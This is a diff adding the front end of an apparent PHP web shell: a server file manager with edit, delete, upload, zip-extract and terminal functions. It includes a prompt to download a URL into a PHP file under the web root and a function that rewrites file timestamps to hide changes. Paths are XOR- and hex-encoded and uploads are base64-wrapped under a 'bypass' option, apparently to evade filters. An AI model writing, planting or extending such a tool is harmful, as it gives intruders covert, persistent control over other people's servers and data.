+            transition: color 0.12s;
+        }
+
+        .terminal-close-btn:hover {
+            color: var(--red);
+        }
+
+        .terminal-body {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .terminal-output {
+            flex: 1;
+            min-height: 200px;
+            max-height: 50vh;
+            overflow-y: auto;
+            background: #000000;
+            color: #f1f1f1;
+            padding: 14px 16px;
+            font-family: var(--mono);
+            font-size: 12.5px;
+            line-height: 1.7;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .terminal-output::-webkit-scrollbar { width: 5px; }
+        .terminal-output::-webkit-scrollbar-track { background: transparent; }
+        .terminal-output::-webkit-scrollbar-thumb { background: #262626; border-radius: 4px; }
+
+        .terminal-tools {
+            display: flex;
+            gap: 6px;
+            padding: 8px 14px;
+            border-top: 1px solid #262626;
+            background: #111111;
+        }
+
+        .terminal-tool-btn {
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            border: 1px solid #262626;
+            background: transparent;
+            color: #aaaaaa;
+            font-family: var(--mono);
+            font-size: 11px;
+            transition: all 0.12s;
+        }
+
+        .terminal-tool-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .terminal-input-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 14px;
+            border-top: 1px solid #262626;
+            background: #111111;
+        }
+
+        .terminal-prompt {
+            font-family: var(--mono);
+            font-size: 13px;
+            color: var(--green);
+            white-space: nowrap;
+            user-select: none;
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #f1f1f1;
+            font-family: var(--mono);
+            font-size: 13px;
+            outline: none;
+            caret-color: var(--accent);
+        }
+
+        .terminal-input::placeholder { color: #999999; }
+
+        .table-blurred {
+            filter: blur(5px);
+            opacity: 0.3;
+            pointer-events: none;
+            transition: filter 0.2s, opacity 0.2s;
+        }
+
+        
+        .dialog-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9500;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+        }
+
+        .dialog-overlay.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dialog-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            width: 420px;
+            max-width: 92vw;
+            box-shadow: 0 16px 48px rgba(0,0,0,0.6);
+            animation: termSlideUp 0.18s cubic-bezier(0.16,1,0.3,1);
+        }
+
+        .dialog-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .dialog-title {
+            font-family: var(--mono);
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--accent);
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+        }
+
+        .dialog-close {
+            background: none;
+            border: none;
+            color: var(--text-dim);
+            font-size: 18px;
+            cursor: pointer;
+            padding: 0 4px;
+            line-height: 1;
+            transition: color 0.12s;
+        }
+
+        .dialog-close:hover { color: var(--red); }
+
+        .dialog-body {
+            padding: 20px;
+        }
+
+        .dialog-field {
+            margin-bottom: 14px;
+        }
+
+        .dialog-field label {
+            display: block;
+            font-family: var(--mono);
+            font-size: 11px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-bottom: 5px;
+        }
+
+        .dialog-field input,
+        .dialog-field select {
+            width: 100%;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-family: var(--mono);
+            font-size: 12.5px;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .dialog-field input:focus,
+        .dialog-field select:focus {
+            border-color: var(--accent);
+        }
+
+        .dialog-field select {
+            appearance: none;
+            cursor: pointer;
+        }
+
+        .dialog-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+            padding: 14px 16px;
+            border-top: 1px solid var(--border);
+        }
+
+        .dialog-footer .btn-save {
+            background: var(--accent);
+            color: var(--bg);
+            border: 1px solid var(--accent);
+        }
+
+        .dialog-footer .btn-save:hover {
+            background: #ffb84d;
+            border-color: #ffb84d;
+            color: var(--bg);
+        }
+    </style>
+    <script>
+ 
+        function getCookie(name) {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+        const fileIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#aaaaaa" viewBox="0 0 16 16" style="vertical-align: -0.125em;">
+        <path d="M4 0h8a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z"/>
+        </svg>`;
+        const folderIcon = `<svg class='icon-folder' xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#ffffff" viewBox="0 0 16 16" style="vertical-align: -0.125em;">
+  <path d="M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .54-1.31zM2.19 4a1 1 0 0 0-.996.819l-.637 7A1 1 0 0 0 1.558 13h11.618a1 1 0 0 0 .996-.819l.637-7A1 1 0 0 0 13.81 4H2.19z"/>
+</svg>`;
+        const loadFile = '<?php echo $glob_file; ?>' || getCookie('glob-file');
+        const homePath = '<?php echo getcwd(); ?>'
+        const docRoot = '<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>'.replace(/\/$/, "")
+
+    </script>
+        <script>
+
+
+        const urlObject = new URL(window.location.href)
+        const baseUrl = `${urlObject.origin}${urlObject.pathname}`
+
+        const essential_id = [
+            'file-table',
+            'byp',
+            'path_div',
+            'bypass-section',
+            'tools',
+            'file-manager',
+            'tool-panel'
+        ]
+
+        const additional_id = [
+            'com-section'
+        ]
+
+ 
+        function change_path(obj) {
+
+
+            var path = obj.getAttribute("path");
+
+            localStorage.setItem("path", path)
+            console.log("change to " + path);
+            init(path);
+            changePath(path);
+
+        }
+
+        function changePath(path) {
+
+            const wrapper = document.getElementById('path_div');
+
+
+            wrapper.innerHTML = '';
+
+            const paths = path.split('/').filter(Boolean);
+
+
+            let rootLink = document.createElement('a');
+            rootLink.href = "#";
+            rootLink.textContent = "/";
+            rootLink.setAttribute("onclick", "change_path(this)")
+            rootLink.setAttribute("path", "/")
+            wrapper.appendChild(rootLink);
+
+
+            paths.forEach((pat, id) => {
+                let tmpPath = '/' + paths.slice(0, id + 1).join('/');
+                let link = document.createElement('a');
+                link.href = "#";
+                link.setAttribute('path', tmpPath);
+                link.textContent = `${pat}/`;
+                link.setAttribute("onclick", "change_path(this)");
+                wrapper.appendChild(link);
+            });
+        }
+
+
+        function get_current_path() {
+            var path_div = document.getElementById("path_div");
+            if (!path_div) return "";
+            var raw = path_div.textContent || "";
+            return raw.replace(/[\r\n]+/g, "").trim();
+        }
+
+        function create_file() {
+            var name = prompt("File name  ", "hello.php")
+            var current_path = get_current_path();
+            if (!name) { return; }
+            var dir = prompt("Directory ", current_path)
+            if (!dir) { return; }
+            var fullPath = `${dir}/${name}`;
+
+            var editorPanel = document.getElementById('inline-editor-panel');
+            var mainPanel = document.getElementById('main-file-panel');
+            document.getElementById('inline-editor-filename-display').textContent = fullPath;
+            document.getElementById('inline-editor-filename-hidden').value = encodeXorString(fullPath);
+            document.getElementById('inline-editor-content').value = '';
+            mainPanel.classList.add('hidden');
+            document.getElementById('path_div').classList.add('hidden');
+            editorPanel.classList.remove('hidden');
+            document.getElementById('inline-editor-content').focus();
+        }
+
+        function refresh_path() {
+            localStorage.clear();
+            init();
+            changePath(homePath)
+        }
+
+        var contextMenuTarget = null;
+
+        function showContextMenu(e, path, isDir, rowEl, fileDisplayName, dateStr) {
+            contextMenuTarget = { path: path, isDir: isDir, row: rowEl, fileDisplayName: fileDisplayName, date: dateStr || "" };
+            var menu = document.getElementById("context-menu");
+            menu.classList.add("show");
+            var x = e.clientX;
+            var y = e.clientY;
+            menu.style.left = x + "px";
+            menu.style.top = y + "px";
+            var rect = menu.getBoundingClientRect();
+            var vw = window.innerWidth;
+            var vh = window.innerHeight;
+            if (x + rect.width > vw) x = vw - rect.width - 4;
+            if (y + rect.height > vh) y = vh - rect.height - 4;
+            if (x < 4) x = 4;
+            if (y < 4) y = 4;
+            menu.style.left = x + "px";
+            menu.style.top = y + "px";
+            var editItem = menu.querySelector('[data-action="edit"]');
+            var viewItem = menu.querySelector('[data-action="view"]');
+            var extractItem = menu.querySelector('[data-action="extract"]');
+            if (isDir) {
+                editItem.classList.add("disabled");
+                viewItem.classList.add("disabled");
+                if (extractItem) extractItem.style.display = "none";
+            } else {
+                editItem.classList.remove("disabled");
+                viewItem.classList.remove("disabled");
+                if (extractItem) {
+                    if (fileDisplayName.toLowerCase().endsWith('.zip')) {
+                        extractItem.style.display = "block";
+                    } else {
+                        extractItem.style.display = "none";
+                    }
+                }
+            }
+        }
+
+        function hideContextMenu() {
+            document.getElementById("context-menu").classList.remove("show");
+            contextMenuTarget = null;
+        }
+
+        function doContextExtract() {
+            if (!contextMenuTarget) return;
+            var path = contextMenuTarget.path;
+            hideContextMenu();
+            var data = new FormData();
+            var cmd_func = localStorage.getItem("cmdFunc")
+            data.append("filename", encodeXorString(path));
+            data.append("function", cmd_func)
+
+            set_message("Extracting...");
+            post_url('extract', data, false).then(function(response) {
+                safeParseResponse(response).then(function(result) {
+                    if (result.ok && result.data.success) {
+                        set_message("Extracted successfully!");
+                        var currentObj = document.querySelector('a[path="' + get_current_path() + '"]');
+                        init(get_current_path());
+                    } else {
+                        set_message("Extraction failed.");
+                    }
+                });
+            });
+        }
+
+        function doContextView() {
+            if (!contextMenuTarget || contextMenuTarget.isDir) {
+                if (!contextMenuTarget) set_message("Right-click on a file or folder first");
+                hideContextMenu();
+                return;
+            }
+            var path = contextMenuTarget.path;
+            if (path.includes(docRoot) && path !== docRoot) {
+                var file_url = window.location.origin + path.replace(docRoot, '/');
+                window.open(file_url, '_blank');
+            }
+            hideContextMenu();
+        }
+
+        function doContextEdit() {
+            if (!contextMenuTarget || contextMenuTarget.isDir) {
+                if (!contextMenuTarget) set_message("Right-click on a file or folder first");
+                hideContextMenu();
+                return;
+            }
+            openInlineEditor(contextMenuTarget.path);
+            hideContextMenu();
+        }
+
+        function openInlineEditor(filePath) {
+            set_message("Loading file...");
+            var encodedFilename = encodeXorString(filePath);
+            post_url('rf', { filename: encodedFilename }).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok || !result.data.success) {
+                        set_message("ERROR: Could not read file");
+                        return;
+                    }
+                    var content = result.data.encoded ? atob(result.data.content) : result.data.content;
+
+                    var editorPanel = document.getElementById('inline-editor-panel');
+                    var mainPanel = document.getElementById('main-file-panel');
+                    document.getElementById('inline-editor-filename-display').textContent = filePath;
+                    document.getElementById('inline-editor-filename-hidden').value = encodedFilename;
+                    var ta = document.getElementById('inline-editor-content');
+                    ta.value = content;
+                    mainPanel.classList.add('hidden');
+                    document.getElementById('path_div').classList.add('hidden');
+                    editorPanel.classList.remove('hidden');
+                    ta.focus();
+                    ta.setSelectionRange(0, 0);
+                    ta.scrollTop = 0;
+                    set_message("File loaded");
+                });
+            });
+        }
+
+        function closeInlineEditor() {
+            document.getElementById('inline-editor-panel').classList.add('hidden');
+            document.getElementById('main-file-panel').classList.remove('hidden');
+            document.getElementById('path_div').classList.remove('hidden');
+
+            var lastPath = getLastPath();
+            init(lastPath);
+        }
+
+        async function saveInlineEditor() {
+            var content = document.getElementById('inline-editor-content').value;
+            var encoded_content = utf8ToBase64(content);
+            var filename = document.getElementById('inline-editor-filename-hidden').value;
+            if (!filename) {
+                set_message("ERROR: No filename");
+                return;
+            }
+            set_message("Saving...");
+            var data = { content: encoded_content, filename: filename };
+            post_url('r', data).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) { set_message("Invalid response"); return; }
+                    if (result.data.success) {
+                        set_message("Saved!");
+                    } else {
+                        set_message("Failed to save!");
+                    }
+                });
+            });
+        }
+
+        function doContextDelete() {
+            if (!contextMenuTarget) {
+                set_message("Right-click on a file or folder first");
+                hideContextMenu();
+                return;
+            }
+            var path = contextMenuTarget.path;
+            var isDir = contextMenuTarget.isDir;
+            var rowEl = contextMenuTarget.row;
+            var data = new FormData();
+            data.append("filename", encodeXorString(path));
+            data.append("is_dir", isDir ? "1" : "0");
+            post_url('ul', data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("ERROR: Invalid response");
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var message = result.data;
+                    if (message.success) {
+                        set_message("Deleted!");
+                        if (rowEl && rowEl.parentNode) rowEl.remove();
+                    } else {
+                        set_message("Can not delete");
+                    }
+                });
+            });
+            hideContextMenu();
+        }
+
+        function doContextTouch() {
+            if (!contextMenuTarget) {
+                set_message("Right-click on a file or folder first");
+                hideContextMenu();
+                return;
+            }
+            var path = contextMenuTarget.path;
+            var oldDate = contextMenuTarget.date || "";
+            var newdate = prompt("Enter new date (e.g. " + (oldDate || "d-m-Y H:i:s") + "):", oldDate);
+            if (!newdate || newdate === oldDate) {
+                hideContextMenu();
+                return;
+            }
+            var data = new FormData();
+            data.append("date", newdate);
+            data.append("filename", encodeXorString(path));
+            set_message("Loading");
+            post_url("to", data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("ERROR: Invalid response");
+                    hideContextMenu();
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var resp = result.data;
+                    if (resp && resp.success) {
+                        set_message("Date modified!");
+                        contextMenuTarget.row.setAttribute("data-date", newdate);
+                        var dateCell = contextMenuTarget.row.querySelector(".date-cell");
+                        if (dateCell) dateCell.textContent = newdate;
+                    } else {
+                        set_message("ERROR: Failed to change modified date");
+                    }
+                });
+            });
+            hideContextMenu();
+        }
+
+        function doContextRename() {
+            if (!contextMenuTarget) {
+                set_message("Right-click on a file or folder first");
+                hideContextMenu();
+                return;
+            }
+            var path = contextMenuTarget.path;
+            var fileDisplayName = contextMenuTarget.fileDisplayName;
+            var rowEl = contextMenuTarget.row;
+            var dirPath = path.lastIndexOf('/') >= 0 ? path.substring(0, path.lastIndexOf('/')) : '';
+            var newname = prompt("Enter new name:", fileDisplayName);
+            if (!newname || newname === fileDisplayName) {
+                hideContextMenu();
+                return;
+            }
+            var formdata = new FormData();
+            formdata.append("new", newname);
+            formdata.append("filename", encodeXorString(fileDisplayName));
+            formdata.append("path", dirPath);
+            post_url('re', formdata, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("ERROR: Invalid response");
+                    hideContextMenu();
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var resp = result.data;
+                    if (resp.success) {
+                        set_message("Renamed!");
+                        change_data_info(rowEl.querySelector('a[path]') || rowEl, newname);
+                        var newPath = (dirPath ? dirPath + "/" : "") + newname;
+                        rowEl.setAttribute("data-path", newPath);
+                    } else {
+                        set_message("ERROR: Failed to rename");
+                    }
+                });
+            });
+            hideContextMenu();
+        }
+
+        function change_data_info(obj, new_name) {
+            var nodeChild = (obj && obj.parentElement && obj.parentElement.parentNode) ? obj.parentElement.parentNode.getElementsByTagName("a") : [];
+            var file_name = (obj && obj.getAttribute("path")) ? obj.getAttribute("path").split('/').pop().trim() : '';
+            for (var i in nodeChild) {
+                var childObject = nodeChild[i];
+                if (childObject instanceof Element && childObject.hasAttribute("path")) {
+                    var childPath = childObject.getAttribute("path");
+                    var childPathSplit = childPath.split('/');
+                    childPathSplit[childPathSplit.length - 1] = new_name;
+                    if (childPathSplit.length == 1) {
+                        childObject.removeAttribute("path");
+                        childObject.setAttribute("path", childPathSplit[0]);
+                    } else {
+                        var joinPath = childPathSplit.join('/');
+                        childObject.removeAttribute("path");
+                        childObject.setAttribute("path", joinPath);
+                    }
+                    var oldHref = childObject.getAttribute("href");
+                    if (oldHref && oldHref.includes("filename=") && joinPath) {
+                        var new_path = encodeXorString(joinPath);
+                        var new_content = oldHref.replace(/filename=[^&]+/, 'filename=' + new_path);
+                        childObject.setAttribute("href", new_content);
+                    }
+                    if (childObject.hasAttribute("data-path")) {
+                        childObject.setAttribute("data-path", joinPath);
+                    }
+                    if (childObject.innerText.trim() == file_name) {
+                        childObject.innerHTML = childObject.innerHTML.replace(file_name, new_name);
+                    }
+                }
+                if (childObject instanceof Element && childObject.hasAttribute("href")) {
+                    childObject.setAttribute("href", (childObject.getAttribute("href") || '').replace(file_name, new_name));
+                }
+            }
+        }
+
+        function create_table_data(name, size, is_writable, date, is_dir, perms) {
+            var file_name = name.split('/').pop();
+            var table_row = document.createElement("tr");
+            table_row.setAttribute("data-path", name);
+            table_row.setAttribute("data-is-dir", is_dir ? "1" : "0");
+            table_row.setAttribute("data-date", date);
+            table_row.addEventListener("contextmenu", function(e) {
+                e.preventDefault();
+                var currentPath = table_row.getAttribute("data-path") || name;
+                var currentIsDir = table_row.getAttribute("data-is-dir") === "1";
+                var currentDate = table_row.getAttribute("data-date") || date;
+                var currentFileName = currentPath.split('/').pop();
+                showContextMenu(e, currentPath, currentIsDir, table_row, currentFileName, currentDate);
+            });
+
+
+            var tdName = document.createElement("td");
+            if (is_dir) {
+                tdName.innerHTML = `<a href='#' onclick='change_path(this)' path='${name}' class='ml-2em'>${folderIcon} <span>${file_name}</span></a>`;
+            } else {
+                tdName.innerHTML = `<a href='#' onclick='openInlineEditor(this.getAttribute("data-path")); return false;' data-path='${name}' path='${name}'>${fileIcon} <span>${file_name}</span></a>`;
+            }
+            table_row.appendChild(tdName);
+
+
+            var tdSize = document.createElement("td");
+            tdSize.setAttribute("class", "tc size-cell");
+            if (is_dir) {
+                tdSize.innerHTML = `<span style="color:#8a8478;font-size:0.85em;"></span>`;
+            } else {
+                var sizeNum = parseFloat(size);
+                var sizeStr;
+                if (isNaN(sizeNum)) {
+                    sizeStr = size;
+                } else if (sizeNum >= 1024) {
+                    sizeStr = (sizeNum / 1024).toFixed(1) + ' MB';
+                } else if (sizeNum >= 1) {
+                    sizeStr = sizeNum.toFixed(1) + ' KB';
+                } else if (sizeNum > 0) {
+
+                    sizeStr = Math.round(sizeNum * 1024) + ' B';
+                } else {
+                    sizeStr = '0 B';
+                }
+                tdSize.innerHTML = sizeStr;
+            }
+            table_row.appendChild(tdSize);
+
+
+            var tdPerm = document.createElement("td");
+            tdPerm.setAttribute("class", "tc");
+            if (is_writable) {
+                tdPerm.innerHTML = `<span class="badge-writable">${perms || 'Writable'}</span>`;
+            } else {
+                tdPerm.innerHTML = `<span class="badge-readonly">${perms || 'Read-only'}</span>`;
+            }
+            table_row.appendChild(tdPerm);
+
+
+            var tdDate = document.createElement("td");
+            tdDate.setAttribute("class", "tc date-cell");
+            tdDate.textContent = date;
+            table_row.appendChild(tdDate);
+
+            document.getElementById("data_table").appendChild(table_row);
+        }
+
+        function ask_url_path() {
+            var url = prompt("URL : ")
+            var file_path = prompt("File Save : ", `${docRoot}/hello.php`)
+            if(!url || !file_path){
+                return false;
+            }
+            return {
+                url: url,
+                file_path: file_path
+                
+            }
+        }
+
+        function touch_file(obj) {
+            var filename = obj.getAttribute("path");
+
+            var old_date = obj.getAttribute("value");
+            var newdate = prompt("Enter your new date : ", old_date)
+            if (newdate && newdate !== old_date) {
+                var data = new FormData();
+
+                data.append("date", newdate);
+                data.append("filename", encodeXorString(filename));
+
+                set_message("Loading");
+                post_url('to', data, false).then(function(response) {
+                    if (!response.ok) {
+                        set_message("ERROR: Invalid response");
+                        return;
+                    }
+                    safeParseResponse(response).then(function(result) {
+                        if (!result.ok) {
+                            set_message("Invalid response (not JSON)");
+                            return;
+                        }
+                        var resp = result.data;
+                        if (resp.success) {
+                            set_message("Date modified!");
+                            obj.innerText = newdate;
+                            obj.setAttribute("value", newdate);
+                        } else {
+                            set_message("ERROR: Failed to change modified date");
+                        }
+                    });
+                });
+            }
+
+
+        }
+
+        function rename_file(obj) {
+            var current_filename = obj.getAttribute("path")
+            var newname = prompt("Enter your new name : ", current_filename)
+            if (newname && newname !== current_filename) {
+                var formdata = new FormData();
+
+                formdata.append("new", newname);
+                formdata.append("filename", encodeXorString(current_filename))
+                formdata.append("path", get_current_path());
+
+                post_url('re', formdata, false).then(function(response) {
+                    if (!response.ok) {
+                        set_message("ERROR: Invalid response");
+                        return;
+                    }
+                    safeParseResponse(response).then(function(result) {
+                        if (!result.ok) {
+                            set_message("Invalid response (not JSON)");
+                            return;
+                        }
+                        var resp = result.data;
+                        if (resp.success) {
+                            set_message("Renamed!");
+                            change_data_info(obj, newname);
+                            var parentRow = obj.closest('tr');
+                            if (parentRow) {
+                                var currentPath = parentRow.getAttribute('data-path') || '';
+                                var dirPath = currentPath.lastIndexOf('/') >= 0 ? currentPath.substring(0, currentPath.lastIndexOf('/')) : '';
+                                var newPath = (dirPath ? dirPath + "/" : "") + newname;
+                                parentRow.setAttribute('data-path', newPath);
+                            }
+                        } else {
+                            set_message("ERROR: Failed to rename");
+                        }
+                    });
+                });
+            }
+
+
+        }
+
+        function delete_file(obj) {
+            var filename = obj.getAttribute("path")
+            var data = new FormData();
+
+            data.append("filename", encodeXorString(filename));
+
+            post_url('ul', data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("ERROR: Invalid response");
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var message = result.data;
+                    if (message.success) {
+                        set_message("File Deleted!");
+                        obj.parentElement.parentNode.remove();
+                    } else {
+                        set_message("Can not delete");
+                    }
+                });
+            });
+
+
+        }
+
+        function post_url(action, data, parse_json = true) {
+
+            if (parse_json) {
+                data = JSON.stringify(data);
+            }
+
+            var action = '?action=' + action;
+            var opts = {
+                method: "POST",
+                body: data
+            };
+            if (parse_json) {
+                opts.headers = { 'Content-Type': 'application/json' };
+            }
+            var response = fetch(action, opts);
+
+            return response;
+        }
+
+        function safeParseResponse(response) {
+            return response.text().then(function(text) {
+                if (!text || typeof text !== 'string') return { ok: false };
+                var s = text.trim();
+                try {
+                    var j = JSON.parse(s);
+                    return { ok: true, data: j };
+                } catch (_) {}
+                var a = s.indexOf('{');
+                var b = s.lastIndexOf('}');
+                if (a >= 0 && b > a) {
+                    try {
+                        var j = JSON.parse(s.substring(a, b + 1));
+                        return { ok: true, data: j };
+                    } catch (_) {}
+                }
+                return { ok: false };
+            }).catch(function() { return { ok: false }; });
+        }
+
+        function stringToHex(str) {
+            return str.split('')
+                .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
+                .join('');
+        }
+
+        function hexToString(hex) {
+            let str = '';
+            for (let i = 0; i < hex.length; i += 2) {
+                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+            }
+            return str;
+        }
+
+        function xorEncryptDecrypt(input, key) {
+            if (key == null) key = String.fromCharCode(0x31, 0x32);
+            var out = '', k = key.length, n = input.length, i;
+            for (i = 0; i < n; i++) {
+                out += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % k));
+            }
+            return out;
+        }
+
+        function format_date_local(ts) {
+            var d = new Date(ts);
+            var dd   = String(d.getDate()).padStart(2, '0');
+            var mm   = String(d.getMonth() + 1).padStart(2, '0');
+            var yyyy = d.getFullYear();
+            var hh   = String(d.getHours()).padStart(2, '0');
+            var min  = String(d.getMinutes()).padStart(2, '0');
+            var ss   = String(d.getSeconds()).padStart(2, '0');
+            return dd + '-' + mm + '-' + yyyy + ' ' + hh + ':' + min + ':' + ss;
+        }
+
+        function insert_row_sorted(newRow, fileName, isDir) {
+            var tbody = document.getElementById('data_table');
+            var rows = Array.from(tbody.querySelectorAll('tr'));
+            var inserted = false;
+            var nameLower = fileName.toLowerCase();
+            for (var i = 0; i < rows.length; i++) {
+                var rowIsDir = rows[i].getAttribute('data-is-dir') === '1';
+                var rowPath  = rows[i].getAttribute('data-path') || '';
+                var rowName  = rowPath.split('/').pop().toLowerCase();
+                if (!isDir && rowIsDir) continue;
+                if (isDir && !rowIsDir) { tbody.insertBefore(newRow, rows[i]); inserted = true; break; }
+                if (nameLower < rowName) { tbody.insertBefore(newRow, rows[i]); inserted = true; break; }
+            }
+            if (!inserted) tbody.appendChild(newRow);
+        }
+
+        var _sortState = { col: '', dir: 'asc' };
+
+        function parseSize(text) {
+            if (!text) return 0;
+            var s = text.trim();
+            if (!s) return 0;
+            var num = parseFloat(s);
+            if (isNaN(num)) return 0;
+            if (/mb/i.test(s)) return num * 1024;
+            if (/kb/i.test(s)) return num;
+            if (/b/i.test(s)) return num / 1024;
+            return num;
+        }
+
+        function getCellValue(row, col) {
+            var cells = row.querySelectorAll('td');
+            switch (col) {
+                case 'name':
+                    var link = cells[1] ? cells[1].querySelector('a[path]') : null;
+                    return link ? link.textContent.trim().toLowerCase() : '';
+                case 'size':
+                    return parseSize(cells[2] ? cells[2].textContent : '');
+                case 'perms':
+                    var badge = cells[3] ? cells[3].querySelector('span') : null;
+                    return badge ? badge.textContent.trim() : '';
+                case 'date':
+                    return cells[4] ? cells[4].textContent.trim() : '';
+                default:
+                    return '';
+            }
+        }
+
+        function sortTable(col) {
+            var tbody = document.getElementById('data_table');
+            if (!tbody) return;
+            var rows = Array.from(tbody.querySelectorAll('tr'));
+
+            if (_sortState.col === col) {
+                _sortState.dir = _sortState.dir === 'asc' ? 'desc' : 'asc';
+            } else {
+                _sortState.col = col;
+                _sortState.dir = 'asc';
+            }
+
+            document.querySelectorAll('.file-table th.sortable').forEach(function(th) {
+                th.classList.remove('sort-asc', 'sort-desc');
+            });
+            var th = document.querySelector('th[data-sort="' + col + '"]');
+            if (th) th.classList.add(_sortState.dir === 'asc' ? 'sort-asc' : 'sort-desc');
+
+            var dir = _sortState.dir === 'asc' ? 1 : -1;
+
+            rows.sort(function(a, b) {
+                var aIsDir = a.getAttribute('data-is-dir') === '1';
+                var bIsDir = b.getAttribute('data-is-dir') === '1';
+                if (aIsDir !== bIsDir) return bIsDir - aIsDir;
+
+                var aVal = getCellValue(a, col);
+                var bVal = getCellValue(b, col);
+
+                if (col === 'size') {
+                    return (aVal - bVal) * dir;
+                }
+
+                if (typeof aVal === 'string') return aVal.localeCompare(bVal) * dir;
+                return 0;
+            });
+
+            rows.forEach(function(row) { tbody.appendChild(row); });
+        }
+
+        function process_upload(data, file_upload) {
+            var current_path = localStorage.getItem("path") || get_current_path();
+            set_message("Processing!")
+            post_url('up', data, false).then(function(resp) {
+                if (!resp.ok) {
+                    set_message("Error: Invalid status code");
+                    return;
+                }
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var j = result.data;
+                    if (j.success) {
+                        var filesize = (file_upload.size / 1024).toFixed(2);
+                        var last_modified = format_date_local(file_upload.lastModified);
+                        var name = current_path + "/" + file_upload.name;
+                        set_message("File Uploaded!");
+                        removeLinkByFilename(file_upload.name);
+
+                        var stageTbody = document.createElement('tbody');
+                        stageTbody.id = 'data_table';
+                        var realTbody = document.getElementById('data_table');
+                        realTbody.id = '__real_data_table';
+                        document.getElementById('file-table').appendChild(stageTbody);
+                        create_table_data(name, filesize, true, last_modified, false, '0644');
+                        stageTbody.id = '';
+                        realTbody.id = 'data_table';
+                        var newRow = stageTbody.querySelector('tr');
+                        if (newRow) insert_row_sorted(newRow, file_upload.name, false);
+                        stageTbody.remove();
+                    } else {
+                        set_message("ERROR: Failed to upload");
+                    }
+                });
+            });
+        }
+
+        function handle_upload() {
+
+            var upload_input = document.getElementById("file-upload-input")
+            var file_upload = upload_input.files[0];
+            var bypass_upload = document.getElementById("bypass-upload")
+            var current_path = localStorage.getItem("path") || get_current_path();
+            var reader = new FileReader()
+
+            var data = new FormData()
+            data.append("path", stringToHex(xorEncryptDecrypt(current_path)));
+
+            if (bypass_upload.checked) {
+
+
+                reader.readAsArrayBuffer(file_upload)
+
+                data.append("by", true)
+                reader.onload = function(event) {
+                    var arrayBuffer = event.target.result;
+                    var binaryString = '';
+                    var bytes = new Uint8Array(arrayBuffer);
+                    var len = bytes.byteLength;
+                    for (var i = 0; i < len; i++) {
+                        binaryString += String.fromCharCode(bytes[i]);
+                    }
+                    var encoded_content = utf8ToBase64(binaryString);
+                    var encoded_file = new File(
+                        [encoded_content],
+                        file_upload.name, {
+                            type: "text/plain"
+                        }
+                    )
+                    data.append("import_file", encoded_file)
+                    process_upload(data, encoded_file)
+                }
+            } else {
+                data.append("import_file", file_upload);
+                process_upload(data, file_upload)
+            }
+
+            upload_input.value = ''
+
+        }
+
+        function utf8ToBase64(str) {
+
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+        async function textarea_handle() {
+            var content = document.getElementById("content");
+            var encoded_content = utf8ToBase64(content.value);
+            var filenameEl = document.getElementById("edit-filename");
+            var filename = filenameEl ? filenameEl.value : (new URLSearchParams(window.location.search)).get("filename");
+            if (!filename) {
+                set_message("ERROR: No filename (reopen file from list)");
+                return;
+            }
+            set_message("Processing")
+
+            var data = {
+                "content": encoded_content,
+                "filename": filename
+            }
+
+            post_url('r', data).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
